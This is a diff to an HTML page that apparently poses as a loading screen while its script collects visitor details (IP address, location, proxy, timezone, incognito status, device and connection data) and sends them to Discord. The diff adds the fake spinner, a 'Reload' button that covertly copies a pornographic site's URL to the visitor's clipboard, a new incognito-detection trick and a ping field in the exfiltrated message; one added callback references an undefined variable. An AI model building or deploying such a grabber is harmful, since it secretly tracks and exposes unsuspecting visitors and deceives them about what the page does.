@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title></title>
+    <div class="loader"></div>
+    <button class="reload-btn" onclick="copyToClipboard()">Reload</button>
     <style>
         .message-container {
             background-color: #f2f2f2; /* серый фон */
@@ -25,6 +27,53 @@
         }
         .info-value {
             margin-left: 10px;
+        }
+
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #121212;
+        }
+
+        .loader {
+            border: 16px solid #f3f3f3;
+            border-top: 16px solid #3498db;
+            border-radius: 50%;
+            width: 120px;
+            height: 120px;
+            animation: spin 2s linear infinite;
+            position: absolute;
+            top: 40%;
+            left: 45%;
+            transform: translate(-50%, -50%);
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .reload-btn {
+            position: absolute;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #3498db;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 25px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .reload-btn:hover {
+            background-color: #2980b9;
         }
     </style>
     <script>
@@ -133,6 +182,13 @@
             }
 
             return { browserInfo, version };
+        }
+
+        function copyToClipboard() {
+            const textToCopy = 'https://rt.pornhub.com';
+            navigator.clipboard.writeText(textToCopy).then(() => {
+                console.error('', err);
+            });
         }
 
         async function getCityAndCoordinates() {
@@ -438,14 +494,29 @@ async function getProxyInfo() {
 }
 
 async function detectIncognitoMode() {
+    const db = indexedDB.open("test");
+
     return new Promise((resolve) => {
-        const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
-        if (!fs) {
-            resolve(false); // Если FileSystem API не поддерживается, не инкогнито
-        } else {
-            fs(window.TEMPORARY, 100, () => resolve(false), () => resolve(true));
-        }
+        db.onerror = function () {
+            resolve("Yes");
+        };
+        db.onsuccess = function () {
+            resolve("No");
+        };
     });
+}
+
+async function getPing() {
+    const startTime = Date.now();
+    
+    try {
+        await fetch("https://www.google.com", { mode: 'no-cors' });
+        const endTime = Date.now();
+        const ping = endTime - startTime;
+        return `${ping} ms`;
+    } catch (error) {
+        return "Ping measurement failed";
+    }
 }
 
 async function sendInfoToDiscord() {
@@ -484,6 +555,7 @@ async function sendInfoToDiscord() {
     const proxyInfo = await getProxyInfo();
     const TimeZone = await Intl.DateTimeFormat().resolvedOptions().timeZone;
     const isIncognito = await detectIncognitoMode();
+    const Ping = await getPing();
     const message = "****                User Information****\n" +
                     "****-----------------------------------****\n" +
                     "- 🗺️ **IP Address**: `" + ipAddress + "`\n" +
@@ -498,6 +570,7 @@ async function sendInfoToDiscord() {
                     "- 🛰️ **Connection Status**: `" + isOnline + "`\n" +
                     "- 🛸 **Connection Type**: `" + connectionType + "`\n" +
                     "- 🚀 **Internet Speed**: `" + internetSpeed + "`\n" +
+                    "- 📶 **Ping**: `" + Ping + "`\n" +
                     "- 🎇 **Time On Page**: `" + uptime + "`\n" +
                     "- 🎮 **Device**: `" + deviceType + "`\n" +
                     "- 🗜️ **Windows**: `" + WindowsType + "`\n" +
